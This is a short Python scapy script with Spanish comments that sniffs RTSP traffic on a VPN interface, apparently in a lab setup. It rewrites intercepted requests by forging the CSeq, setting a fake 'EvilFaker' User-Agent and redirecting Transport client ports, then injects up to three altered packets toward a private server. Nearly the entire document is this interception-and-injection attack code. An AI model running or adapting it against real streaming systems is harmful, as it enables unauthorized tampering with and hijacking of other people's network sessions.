from scapy.all import *

# Configuraciones
IP_SERVIDOR = "10.147.19.221"
PUERTO_RTSP = 8554
INTERFAZ_VPN = "ztrf23gpht"

print(f"Escuchando paquetes RTSP TCP en interfaz '{INTERFAZ_VPN}' para modificar y reenviar...")

modificados = 0
LIMITE = 3       

def modificar_y_reenviar(pkt):
    global modificados

    if modificados >= LIMITE:
        return 

    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        original = pkt[Raw].load.decode(errors='ignore')

        if original.startswith(("OPTIONS", "ANNOUNCE", "SETUP", "DESCRIBE", "PLAY")):

            print("\n Paquete original interceptado:")
            print(original)

            modificado = re.sub(r"CSeq:\s*\d+", "CSeq: 9999", original)
            modificado = re.sub(r"User-Agent:.*", "User-Agent: EvilFaker/9.9", modificado)
            if "Transport:" in modificado:
                modificado = re.sub(
                    r"Transport:.*",
                    "Transport: RTP/AVP/UDP;unicast;client_port=9998-9999;mode=play",
                    modificado
                )

            print("\n Paquete modificado:")
            print(modificado)

            paquete = IP(dst=IP_SERVIDOR)/TCP(dport=PUERTO_RTSP, sport=RandShort(), flags="PA")/Raw(load=modificado.encode())
            send(paquete)

            print(" Paquete reenviado con modificaciones.")
            modificados += 1

sniff(
    iface=INTERFAZ_VPN,
    filter=f"tcp port {PUERTO_RTSP}",
    prn=modificar_y_reenviar,
    store=0
)